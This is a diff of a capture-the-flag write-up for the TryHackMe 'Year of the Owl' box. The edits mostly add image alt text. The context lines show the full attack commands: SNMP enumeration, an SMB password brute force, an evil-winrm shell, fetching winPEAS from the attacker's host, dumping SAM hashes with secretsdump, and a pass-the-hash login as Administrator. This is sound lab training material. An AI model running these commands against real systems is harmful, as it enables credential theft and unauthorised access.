@@ -17,7 +17,7 @@ author: "Moiz Bootwala"
 
 The foolish owl sits on his throne...
 <!--more-->
-To access the link, click on the link given below:
+To access the box, click on the link given below:
 - https://tryhackme.com/room/yearoftheowl
 
 ## Reconnaissance
@@ -37,13 +37,13 @@ nmap -A -p- TARGET --min-rate 10000 -oN yoto.nmap
 | 3306 | mysql   |
 | 3389 | rdp     |
 
-![](https://cdn.ziomsec.com/yearoftheowl/1.webp)
+![performing an nmap scan on year of the owl box](https://cdn.ziomsec.com/yearoftheowl/1.webp)
 
 ## Initial Foothold
 
 I enumerated the services running on the target but was unable to find anything interesting.
 
-![](https://cdn.ziomsec.com/yearoftheowl/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/yearoftheowl/2.webp)
 
 I then tried performed a **udp** scan and found **snmp** to be open.
 
@@ -51,7 +51,7 @@ I then tried performed a **udp** scan and found **snmp** to be open.
 nmap -sU -p 161 TARGET
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/3.webp)
+![performing a UDP scan with nmap](https://cdn.ziomsec.com/yearoftheowl/3.webp)
 
 I enumerated **snmp** using **snmp-check** and found a username.
 
@@ -59,7 +59,7 @@ I enumerated **snmp** using **snmp-check** and found a username.
 snmp-check TARGET -c openview
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/4.webp)
+![enumerating snmp to discover a username](https://cdn.ziomsec.com/yearoftheowl/4.webp)
 
 I bruteforced the **smb** password of this user from *rockyou.txt* using **crackmapexec**.
 
@@ -67,7 +67,7 @@ I bruteforced the **smb** password of this user from *rockyou.txt* using **crack
 crackmapexec smb TARGET -u Jareth -p /usr/share/wordlists/rockyou.txt
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/5.webp)
+![bruteforcing password for SMB](https://cdn.ziomsec.com/yearoftheowl/5.webp)
 
 I then enumerated the shares using this credential, but found nothing.
 
@@ -75,7 +75,7 @@ I then enumerated the shares using this credential, but found nothing.
 smnmap -u Jareth -p sarah -H TARGET
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/6.webp)
+![enumerating the SMB shares](https://cdn.ziomsec.com/yearoftheowl/6.webp)
 
 I then checked if the credentials were valid for **winrm** and **rdp**.
 
@@ -84,9 +84,9 @@ nxc rdp TARGET -u 'Jareth' -p 'sarah'
 nxc winrm TARGET -u 'Jareth' -p 'sarah'
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/7.webp)
+![validating the credentials against rdp](https://cdn.ziomsec.com/yearoftheowl/7.webp)
 
-![](https://cdn.ziomsec.com/yearoftheowl/8.webp)
+![validating the credentials against winrm](https://cdn.ziomsec.com/yearoftheowl/8.webp)
 
 I used **winrm** to get shell a shell on the target.
 
@@ -94,11 +94,11 @@ I used **winrm** to get shell a shell on the target.
 evil-winrm -u Jareth -p sarah -t TARGET
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/9.webp)
+![accessing the machine using winrm](https://cdn.ziomsec.com/yearoftheowl/9.webp)
 
 Finally I captured the user flag from *Jareth*'s *Desktop*.
 
-![](https://cdn.ziomsec.com/yearoftheowl/10.webp)
+![capturing the user flag](https://cdn.ziomsec.com/yearoftheowl/10.webp)
 
 ## Privilege Escalation
 
@@ -109,12 +109,11 @@ $ iwr http://KALI/winPEAS/ps1 -OutFile C:\Users\Jareth\Desktop\winPEAS.ps1
 $ ./winPEAS.ps1
 ```
 
-
 I found a backup of the **sam** and **system** registries.
 
-![](https://cdn.ziomsec.com/yearoftheowl/11.webp)
+![discovering SAM registry backup](https://cdn.ziomsec.com/yearoftheowl/11.webp)
 
-![](https://cdn.ziomsec.com/yearoftheowl/12.webp)
+![discovery SYSTEM registry backup](https://cdn.ziomsec.com/yearoftheowl/12.webp)
 
 Hence, I copied these backups to the desktop and then downloaded them on my system.
 
@@ -126,7 +125,7 @@ download system.bak
 download sam.bak
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/13.webp)
+![transferring the registry backups to local system](https://cdn.ziomsec.com/yearoftheowl/13.webp)
 
 I then cracked them using **`impacket-secretsdump`** and found the Administrator hash.
 
@@ -134,7 +133,7 @@ I then cracked them using **`impacket-secretsdump`** and found the Administrator
 impacket-secretsdump -system system.bak -sam sam.bak local
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/14.webp)
+![dumping the contents using secretsdump.py](https://cdn.ziomsec.com/yearoftheowl/14.webp)
 
 I then used the Administrator's hash to get shell access on the target using **winrm** and captured the root flag from *Desktop*.
 
@@ -142,7 +141,7 @@ I then used the Administrator's hash to get shell access on the target using **w
 evil-winrm -u Administrator -H LM_HASH -i TARGET
 ```
 
-![](https://cdn.ziomsec.com/yearoftheowl/15.webp)
+![capturing the admin flag](https://cdn.ziomsec.com/yearoftheowl/15.webp)
 
 That's it from my side! Until next time.
 
